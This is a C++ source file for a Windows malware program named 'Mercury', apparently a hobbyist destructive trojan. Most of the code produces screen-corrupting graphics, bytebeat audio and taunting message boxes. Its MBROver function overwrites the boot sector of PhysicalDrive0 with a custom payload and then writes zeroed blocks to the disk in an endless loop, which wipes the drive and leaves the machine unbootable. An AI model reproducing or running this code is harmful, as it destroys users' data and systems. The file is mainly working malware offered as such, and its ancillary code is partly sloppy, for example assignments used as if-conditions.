typedef struct IUnknown IUnknown;
#pragma warning
#include "payloads.h"
#include <Windows.h>
#include <time.h>
#include <stdlib.h>
#include <time.h>
#include <thread>
#include <mmsystem.h>
#include <iostream>
#include <WinUser.h>
#include <stdio.h>
#pragma comment(lib, "Winmm.lib")
#define fori(x) for (INT i = 0; i < x; i++)


HDC hdc = GetDC(0);
HWND hwnd = GetDesktopWindow();
RECT rect;
int ScreenWidth, ScreenHeight;
int Interval = 100;
int x = GetSystemMetrics(0);
int y = GetSystemMetrics(1);
int mouseX, mouseY = GetCursorPos(0);
int r = rand() % 2;
int cln = rand() % 27;
INT w = rect.right - rect.left;
INT h = rect.bottom - rect.top;
int screenX = GetSystemMetrics(SM_CXSCREEN);
int screenY = GetSystemMetrics(SM_CYSCREEN);
DWORD
WINAPI
Warning(
    LPVOID lpvd
) {
    if (MessageBoxW(0, L"This is a real malware \n If you run this program your PC/VM will be trashed! \n Still want to continue?", L"Mercury", MB_YESNO | MB_ICONWARNING) == IDNO)
        exit(0);
    MessageBoxW(0, L"You will regret this", L"Mercury", MB_OK | MB_ICONERROR);
}


DWORD
WINAPI
Payload1(
    LPVOID lpvd
) {
    fori(120)
    {
        BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, NOTSRCERASE);
        BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, SRCPAINT);
    }
    DeleteObject(hdc);
    ReleaseDC(0, hdc);
    return 0;
}

DWORD
WINAPI
Payload2(
    LPVOID lpvd
) {
    fori(200)
    {

        SelectObject(GetDC(hwnd), CreateSolidBrush(RGB(
            rand() % 255,
            rand() % 255,
            rand() % 255
        )));
        BitBlt(GetWindowDC(hwnd), rand() % 2, rand() % 2, x, y, GetWindowDC(hwnd), rand() % 2, rand() % 2, SRCPAINT);
    }
    DeleteObject(hwnd);
    ReleaseDC(0, GetWindowDC(hwnd));
    return 0;
}


DWORD WINAPI Payload8(LPVOID lpvd)
{
    HDC hWindow;
    HDC hDsktp;
    HWND hWnd;
    RECT wRect;
    int dX = 0;
    int dY = 0;
    int dW;
    int dH;
    POINT wPt[3];
    int counter = 30;

    fori(110)
    {

        hWnd = GetDesktopWindow();
        hWindow = GetWindowDC(hWnd);
        hDsktp = GetDC(0);
        GetWindowRect(hWnd, &wRect);

        dW = GetSystemMetrics(0);
        dH = GetSystemMetrics(0);

        wPt[0].x = wRect.left - counter;
        wPt[0].y = wRect.top + counter;
        wPt[1].x = wRect.right - counter;
        wPt[1].y = wRect.top - counter;
        wPt[2].x = wRect.left + counter;
        wPt[2].y = wRect.bottom + counter;

        PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

    }
    return 0;
}

DWORD WINAPI Payload9(LPVOID lpvd)
{
    HDC hWindow;
    HDC hDsktp;
    HWND hWnd;
    RECT wRect;
    int dX = 0;
    int dY = 0;
    int dW;
    int dH;
    POINT wPt[3];
    int counter = 30;

    fori(99)
    {

        hWnd = GetDesktopWindow();
        hWindow = GetWindowDC(hWnd);
        hDsktp = GetDC(0);
        GetWindowRect(hWnd, &wRect);

        dW = GetSystemMetrics(0);
        dH = GetSystemMetrics(0);

        wPt[0].x = wRect.left + counter;
        wPt[0].y = wRect.top + counter;
        wPt[1].x = wRect.right - counter;
        wPt[1].y = wRect.top;
        wPt[2].x = wRect.left + counter;
        wPt[2].y = wRect.bottom - counter;

        PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

    }
    return 0;
}

DWORD WINAPI Payload10(LPVOID lpvd)
{
    HDC hWindow;
    HDC hDsktp;
    HWND hWnd;
    RECT wRect;
    int dX = 0;
    int dY = 0;
    int dW;
    int dH;
    POINT wPt[3];
    int counter = 30;

    fori(100)
    {

        hWnd = GetDesktopWindow();
        hWindow = GetWindowDC(hWnd);
        hDsktp = GetDC(0);
        GetWindowRect(hWnd, &wRect);

        dW = GetSystemMetrics(0);
        dH = GetSystemMetrics(0);

        wPt[0].x = wRect.left + counter;
        wPt[0].y = wRect.top + counter;
        wPt[1].x = wRect.right - counter;
        wPt[1].y = wRect.top;
        wPt[2].x = wRect.left - counter;
        wPt[2].y = wRect.bottom - counter;

        PlgBlt(hDsktp, wPt, hDsktp, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

    }
    return 0;
}

DWORD WINAPI Payload11(LPVOID lpvd)
{
    fori(10)
    {
        HDC hdc = GetDC(NULL);
        int x, y, l, p;
        x = GetSystemMetrics(SM_CXSCREEN);
        y = GetSystemMetrics(SM_CYSCREEN);
        HWND hwnd = GetDesktopWindow();
        RECT rekt;
        GetWindowRect(hwnd, &rekt);
        l = rand() % x;
        p = rand() % y;
        StretchBlt(hdc, x, y, rekt.left - x, rekt.top - y, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);

        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI Payload12(LPVOID lpvd)
{
    HDC hdc = 0;
    int sx = 0, sy = 0;
    int rx = 0, ry = 0;

    fori(12)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(SM_CXSCREEN);
        sy = GetSystemMetrics(SM_CYSCREEN);
        rx = rand() % sx;
        ry = rand() % sy;
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(hdc, 0, 0, sx, sy, PATCOPY);
        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI Payload13(LPVOID lpvd)
{
    HDC desk = GetDC(0);
    int xs = GetSystemMetrics(0);
    int ys = GetSystemMetrics(1);
    fori(200)
    {
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(desk, brush);
        Ellipse(desk, rand() % xs, rand() % ys, rand() % xs, rand() % ys);
        BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, NOTSRCERASE);
        BitBlt(hdc, rand() % 2, rand() % 2, x, y, hdc, rand() % 2, rand() % 2, SRCPAINT);
        //BitBlt(GetWindowDC(hwnd), rand() % 2, rand() % 2, x, y, GetWindowDC(hwnd), rand() % 2, rand() % 2, SRCPAINT);
        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI Payload14(LPVOID pnvd)
{
    fori(105)
    {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, 10, 100, w, h, hdc, 12, 12, SRCCOPY);
        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI Payload15(LPVOID lpvd)
{
    fori(104)
    {
        HDC hdc;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int mouseX = GetCursorPos(0);
        int mouseY = GetCursorPos(0);
        fori(104)
            hdc = GetDC(0);
        BitBlt(hdc, rand() % 2, rand() % 2, mouseX, mouseY, hdc, rand() % 2, rand() % 2, SRCAND);
        BitBlt(hdc, mouseX, mouseY, 100, 100, hdc, mouseX, mouseY, SRCCOPY);
        Sleep(1000);
    }
    return 0;
}

DWORD WINAPI Extra(LPVOID lpvd)
{
    HDC hdc;
    POINT cursorPt;
    int sxx = GetCursorPos(&cursorPt);
    int syy = GetCursorPos(&cursorPt);
    LPCWSTR text = L"Mercury up!";
    while (true)
    {
        GetCursorPos(&cursorPt);
        hdc = GetWindowDC(GetDesktopWindow());
        sxx = GetSystemMetrics(0);
        syy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sxx, rand() % syy, text, wcslen(text));
        Sleep(100);
        TextOutW(hdc, cursorPt.x, cursorPt.y, text, wcslen(text));
        Sleep(10);
    }
}

DWORD WINAPI Extra2(LPVOID lpvd)
{
    while (true) {
        {
            DrawIcon(hdc, x, y, (LoadIcon(0, IDI_WARNING)));
            DrawIcon(hdc, x, y, (LoadIcon(0, IDI_ERROR)));
            DrawIcon(hdc, x, y, (LoadIcon(0, IDI_SHIELD)));
            DrawIcon(hdc, x, y, (LoadIcon(0, IDI_HAND)));
            DrawIcon(hdc, x, y, (LoadIcon(0, IDI_INFORMATION)));
        }
    }
}

DWORD WINAPI bytebeat(LPVOID lpvd)
{

    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[4000 * 120];
    for (DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>((t * (t >> 8 & t >> 11) & 127) + 4e4 / (t & 2047));
    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    Sleep(-1);
    return 0;
}

DWORD WINAPI bytebeat2(LPVOID lpvd)
{

    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 40];
    for (DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>((t % 100 >= t * (t / 3000 % 20) % 100) * 255
            | (t / 3)
            | (t / 6)
            | (t / 24) * (t % 100 >= 50)
            | (t / 48) * (t % 100 <= 50)
            );
    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    Sleep(-1);
    return 0;
}

DWORD WINAPI bytebeat3(LPVOID lpvd)
{

    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 40];
    for (DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t & t + (t >> 9 | t >> 9 | t >> 6));
    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    Sleep(-1);
    return 0;
}

DWORD WINAPI bytebeat4(LPVOID lpvd)
{

    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 40];
    for (DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t /= 4, t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10));
    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    Sleep(-1);
    return 0;
}

DWORD WINAPI bytebeat5(LPVOID lpvd)
{

    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 40];
    for (DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>(t * (3 + (t >> 10 & 5 | t >> 9) ^ t * (t >> 8 & t >> 9)) & 4096 ? t >> 4 : 32);
    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    Sleep(-1);
    return 0;
}

DWORD
WINAPI
Extra3(
    LPVOID lpvd
) {
    fori(25) {
        BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
        BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
    }
    return 0;
}

DWORD
WINAPI
Extra4(
    LPVOID lpvd
) {
    while (true) {
        SelectObject(GetDC(hwnd), CreateSolidBrush(RGB(
            rand() % 255,
            rand() % 255,
            rand() % 255
        )));
        BitBlt(GetWindowDC(hwnd), rand() % 2, rand() % 2, x, y, GetWindowDC(hwnd), rand() % 2, rand() % 2, SRCPAINT);
        PatBlt(hdc, 0, 0, x, y, PATINVERT);
        BitBlt(hdc, rand() % x, rand() % y, rand() % 600, rand() % 600, hdc, rand() % x, rand() % y, SRCCOPY);
        BitBlt(hdc, rand() % x, rand() % y, rand() % 600, rand() % 600, hdc, rand() % x, rand() % y, SRCCOPY);
        BitBlt(hdc, rand() % x, rand() % y, rand() % 600, rand() % 600, hdc, rand() % x, rand() % y, SRCCOPY);
        BitBlt(hdc, rand() % x, rand() % y, rand() % 600, rand() % 600, hdc, rand() % x, rand() % y, SRCCOPY);
    }
}

DWORD
WINAPI
RandFuck(
    LPVOID lpvd
) {
    int p = rand() % 20;
    fori (10)
    {
        if (p = 11) {
            fori(30) {
                BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
                BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, x, x, hdc, 0, 0, SRCCOPY);
            }
        }
    }
    return 0;
}

DWORD
WINAPI
MsgBoxes(
    LPVOID lpvd
) {
    int p = rand() % 20;
    while (true)
    {
        if (p = 20) {
            MessageBoxW(0, L"How your computer runs lol", L"Mercury", MB_OK | MB_ICONERROR);
        }
        if (p = 10) {
            MessageBoxW(0, L"Fucked by Mercury", L"Mercury", MB_OK | MB_ICONERROR);
        }
        if (p = 12) {
            MessageBoxW(0, L"Made by hex", L"Mercury", MB_OK | MB_ICONERROR);
        }
        if (p = 17) {
            MessageBoxW(0, L"malwarebytes cant save this", L"Mercury", MB_OK | MB_ICONERROR);
        }
        if (p = 10) {
            MessageBoxW(0, L"ur pc is trashed now", L"Mercury", MB_OK | MB_ICONERROR);
        }
        if (p = 5) {
            if (MessageBoxW(0, L"Stupid idea. Do you regret this?", L"Mercury", MB_YESNO | MB_ICONQUESTION) == IDYES)
                MessageBoxW(0, L"well to late", L"whoops", MB_OK);
        }
    }
}

DWORD
WINAPI
MBROver(
    LPVOID lpvd
) {
    HANDLE hDrive;
    DWORD dwWrittenBytes;
    BOOL bSuccess;

    hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDrive == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    bSuccess = WriteFile(hDrive, pccMbrData, 512, &dwWrittenBytes, NULL);

    if (!bSuccess)
    {
        CloseHandle(hDrive);

        return FALSE;
    }

    CHAR pcNullData[512];
    RtlZeroMemory(pcNullData, 512);

    for (;; WriteFile(hDrive, pcNullData, 512, &dwWrittenBytes, NULL));
}


